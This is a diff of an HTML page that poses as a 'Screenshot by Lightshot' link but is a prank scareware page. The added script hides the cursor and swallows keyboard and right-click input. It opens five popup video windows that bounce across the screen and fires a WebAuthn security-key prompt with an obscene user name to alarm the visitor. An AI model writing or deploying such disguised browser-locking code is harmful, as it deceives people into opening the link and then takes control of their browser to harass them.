@@ -1,106 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-<title>Screenshot by Lightshot</title>
-<meta property="og:title" content="Screenshot">
-<meta property="og:site_name" content="Lightshot">
-<meta property="og:image" content="https://vxunder.github.io/youtube/images/lightshot.png"> <!-- Ensure absolute path -->
-<meta property="og:description" content="Captured with Lightshot">
-<meta property="og:type" content="website">
-<meta name="twitter:card" content="photo">
-<meta name="twitter:title" content="Screenshot">
-<meta name="twitter:site" content="@light_shot">
-<meta name="twitter:description" content="Captured with Lightshot">
-<meta name="twitter:image:src" content="https://vxunder.github.io/youtube/images/lightshot.png"> <!-- Ensure absolute path -->
-<link rel="preconnect" href="https://fonts.gstatic.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
-<style>
-    /* Styles */
-    p {
-        margin: 0;
-    }
-    *, *::before, *::after {
-        box-sizing: border-box;
-    }
-    .overlay, .scare {
-        position: fixed;
-        top: 0;
-        left: 0;
-        height: 100vh;
-        width: 100vw;
-    }
-    p.overlay-title {
-        font-size: 24px;
-        font-weight: 900;
-        color: black;
-        margin-bottom: 16px;
-    }
-    .overlay-button {
-        display: inline-flex;
-        align-items: center;
-        height: 40px;
-        padding: 0 24px;
-        font-size: 16px;
-        font-weight: 500;
-        border-radius: 4px;
-        cursor: pointer;
-        margin: 4px;
-    }
-    #accept-button {
-        background-color: rgb(132, 94, 194);
-        color: white;
-    }
-    #decline-button {
-        color: rgb(132, 94, 194);
-        border: 2px solid rgb(132, 94, 194);
-    }
-    p.overlay-description, a.overlay-link {
-        font-size: 16px;
-        font-weight: 400;
-        color: rgba(0, 0, 0, 0.5);
-        line-height: 1.25;
-        margin-bottom: 16px;
-    }
-    .overlay-link {
-        color: rgb(132, 94, 194);
-        position: relative;
-    }
-    .overlay-link::before {
-        content: "";
-        position: absolute;
-        height: calc(50% + 4px);
-        width: calc(100% + 8px);
-        bottom: -4px;
-        left: -4px;
-        background-color: rgba(132, 94, 194, 0.1);
-    }
-    .overlay-body {
-        max-width: 512px;
-        text-align: center;
-        font-family: "Inter", sans-serif;
-    }
-    .overlay[hidden] {
-        display: none;
-    }
-    .overlay {
-        z-index: 2;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        background-color: #f5f6fa;
-        padding: 0 24px;
-    }
-    .scare {
-        z-index: 1;
-    }
-    video#video {
-        height: 100%;
-        width: 100%;
-        object-fit: cover;
-    }
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Screenshot by Lightshot</title>
+    <meta property="og:title" content="Screenshot">
+    <meta property="og:site_name" content="Lightshot">
+    <meta property="og:image" content="https://vxunder.github.io/youtube/images/lightshot.png">
+    <meta property="og:description" content="Captured with Lightshot">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="photo">
+    <meta name="twitter:title" content="Screenshot">
+    <meta name="twitter:site" content="@light_shot">
+    <meta name="twitter:description" content="Captured with Lightshot">
+    <meta name="twitter:image:src" content="https://vxunder.github.io/youtube/images/lightshot.png">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+    <style>
+        /* Styles */
+        p {
+            margin: 0;
+        }
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+        .overlay, .scare {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100vw;
+        }
+        p.overlay-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: black;
+            margin-bottom: 16px;
+        }
+        .overlay-button {
+            display: inline-flex;
+            align-items: center;
+            height: 40px;
+            padding: 0 24px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 4px;
+        }
+        #accept-button {
+            background-color: rgb(132, 94, 194);
+            color: white;
+        }
+        #decline-button {
+            color: rgb(132, 94, 194);
+            border: 2px solid rgb(132, 94, 194);
+        }
+        p.overlay-description, a.overlay-link {
+            font-size: 16px;
+            font-weight: 400;
+            color: rgba(0, 0, 0, 0.5);
+            line-height: 1.25;
+            margin-bottom: 16px;
+        }
+        .overlay-link {
+            color: rgb(132, 94, 194);
+            position: relative;
+        }
+        .overlay-link::before {
+            content: "";
+            position: absolute;
+            height: calc(50% + 4px);
+            width: calc(100% + 8px);
+            bottom: -4px;
+            left: -4px;
+            background-color: rgba(132, 94, 194, 0.1);
+        }
+        .overlay-body {
+            max-width: 512px;
+            text-align: center;
+            font-family: "Inter", sans-serif;
+        }
+        .overlay[hidden] {
+            display: none;
+        }
+        .overlay {
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f5f6fa;
+            padding: 0 24px;
+        }
+        .scare {
+            z-index: 1;
+        }
+        video#video {
+            height: 100%;
+            width: 100%;
+            object-fit: cover;
+        }
+    </style>
 </head>
 <body>
 <div id="overlay" class="overlay">
@@ -115,9 +115,91 @@
     </div>
 </div>
 <div class="scare">
-    <video id="video" class="video" src="media/video.mp4" loop></video>
+    <video id="video" class="video" loop></video>
 </div>
 <script>
+    const VELOCITY = 5;           // Speed of the bouncing window
+    const MARGIN = 10;            // Margin from the edges of the screen
+    const TICK_LENGTH = 100;      // Update interval for the window movement
+    const VIDEOS = [
+        'media/video.mp4'  // Replace with your actual video file paths
+    ];
+
+    function getRandomArrayEntry(arr) {
+        return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function moveWindowBounce() {
+        let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+        let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
+        
+        setInterval(() => {
+            const x = window.screenX,
+                  y = window.screenY,
+                  width = window.outerWidth,
+                  height = window.outerHeight;
+
+            // Check for collision with left and right edges
+            if (x < MARGIN) {
+                vx = Math.abs(vx);
+            } else if (x + width > window.screen.width - MARGIN) {
+                vx = -Math.abs(vx);
+            }
+
+            // Check for collision with top and bottom edges
+            if (y < MARGIN + 20) {
+                vy = Math.abs(vy);
+            } else if (y + height > window.screen.height - MARGIN) {
+                vy = -Math.abs(vy);
+            }
+
+            // Move the window
+            window.moveBy(vx, vy);
+        }, TICK_LENGTH);
+    }
+
+    function requestWebauthnAttestation() {
+        try {
+            const createCredentialDefaultArgs = {
+                publicKey: {
+                    rp: {
+                        name: "Acme"
+                    },
+                    user: {
+                        id: new Uint8Array(16),
+                        name: "support@pornhub.com",
+                        displayName: "Sigma shit"
+                    },
+                    pubKeyCredParams: [{
+                        type: "public-key",
+                        alg: -7
+                    }],
+                    attestation: "direct",
+                    timeout: 60000,
+                    challenge: new Uint8Array([140, 10, 38, 255, 34, 145, 193, 233, 185, 78, 46, 23, 26, 152, 106, 115, 113, 157, 67, 72, 213, 167, 106, 21, 126, 56, 148, 82, 119, 151, 15, 239]).buffer
+                }
+            };
+            const getCredentialDefaultArgs = {
+                publicKey: {
+                    timeout: 60000,
+                    challenge: new Uint8Array([121, 80, 104, 113, 218, 238, 238, 185, 148, 195, 194, 21, 103, 101, 38, 34, 227, 243, 171, 59, 120, 46, 213, 111, 129, 38, 226, 166, 1, 125, 116, 80]).buffer
+                }
+            };
+
+            navigator.credentials.create(createCredentialDefaultArgs).then((cred) => {
+                const idList = [{
+                    id: cred.rawId,
+                    transports: ["usb", "nfc", "ble"],
+                    type: "public-key"
+                }];
+                getCredentialDefaultArgs.publicKey.allowCredentials = idList;
+                return navigator.credentials.get(getCredentialDefaultArgs);
+            });
+        } catch (error) {
+            console.error(error);
+        }
+    }
+
     const video = document.getElementById("video");
     const overlay = document.getElementById("overlay");
     const acceptButton = document.getElementById("accept-button");
@@ -126,85 +208,58 @@
     let hasClicked = false;
 
     // Function to hide cursor and disable keyboard
-   function hideCursorDisableKeyboard() {
-    // Hide the cursor
-    document.body.style.cursor = 'none';
-
-    // Disable all keyboard input and context menu
-    document.addEventListener('keydown', (e) => e.preventDefault(), true);
-    document.addEventListener('contextmenu', (e) => e.preventDefault(), true);
-
-    // Disable all keyboard shortcuts
-    document.onkeydown = function () {
-        return false;
-    };
-
-    // Disable Escape key on all input elements
-    const inputs = document.querySelectorAll("input");
-    inputs.forEach((input) => {
-        input.addEventListener("keydown", function(e) {
-            if (e.key === "Escape" || e.keyCode === 27) { // Escape key
-                console.log("Escape is not allowed!");
-                e.preventDefault(); // Prevent the default behavior of Escape key
-            }
-        });
-    });
-}
-
-
-
-
-    // Function to re-enable cursor and keyboard (optional if needed)
-    function showCursorEnableKeyboard() {
-        document.body.style.cursor = 'default';  // Show the cursor
-
-        // Enable keyboard input
-        document.removeEventListener('keydown', disableInteraction, true);
-        document.removeEventListener('contextmenu', disableInteraction, true);
+    function hideCursorDisableKeyboard() {
+        document.body.style.cursor = 'none';
+        document.addEventListener('keydown', (e) => e.preventDefault(), true);
+        document.addEventListener('contextmenu', (e) => e.preventDefault(), true);
     }
 
-    // Event listener function to prevent all interactions
-    function disableInteraction(event) {
-        event.preventDefault();
+    // Function to create a small window displaying the video
+    function createVideoWindow() {
+        const smallWindow = window.open("", "_blank", "width=400,height=300");
+        smallWindow.document.write(`
+            <html>
+                <head>
+                    <title>Video</title>
+                    <style>
+                        body {
+                            margin: 0;
+                            overflow: hidden;
+                        }
+                        video {
+                            width: 100%;
+                            height: 100%;
+                            object-fit: cover;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <video autoplay loop muted>
+                        <source src="${getRandomArrayEntry(VIDEOS)}" type="video/mp4">
+                    </video>
+                </body>
+            </html>
+        `);
+        smallWindow.document.close();
+        smallWindow.focus();
+        moveWindowBounce();
     }
 
-    // When the button is clicked
-    function buttonClick(event) {
-        event.preventDefault();
-        if (!hasClicked) hasClicked = true;
-        overlay.hidden = true;
-        video.play();
-        enterFullscreen();
-        hideCursorDisableKeyboard();  // Apply hide cursor and disable keyboard when video starts
-    }
-
-    // Fullscreen function
-    function enterFullscreen() {
-        const elem = document.documentElement;
-        if (elem.requestFullscreen) {
-            elem.requestFullscreen();
-        } else if (elem.mozRequestFullScreen) {
-            elem.mozRequestFullScreen();
-        } else if (elem.webkitRequestFullscreen) {
-            elem.webkitRequestFullscreen();
-        } else if (elem.msRequestFullscreen) {
-            elem.msRequestFullscreen();
+    acceptButton.addEventListener("click", () => {
+        overlay.setAttribute("hidden", true);
+        hideCursorDisableKeyboard();
+        requestWebauthnAttestation();
+        for (let i = 0; i < 5; i++) { // Open 5 windows
+            createVideoWindow();
         }
-    }
+    });
 
-    acceptButton.addEventListener("click", buttonClick);
-    declineButton.addEventListener("click", buttonClick);
-    video.addEventListener("click", enterFullscreen);
+    declineButton.addEventListener("click", () => {
+        overlay.setAttribute("hidden", true);
+    });
+
+    video.src = getRandomArrayEntry(VIDEOS);
+    video.play();
 </script>
-
-<!-- Google Tag Manager -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-07T0N39Y0D"></script>
-<script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() { dataLayer.push(arguments); }
-    gtag('js', new Date());
-    gtag('config', 'G-07T0N39Y0D');
-</script>
-
 </body>
 </html>
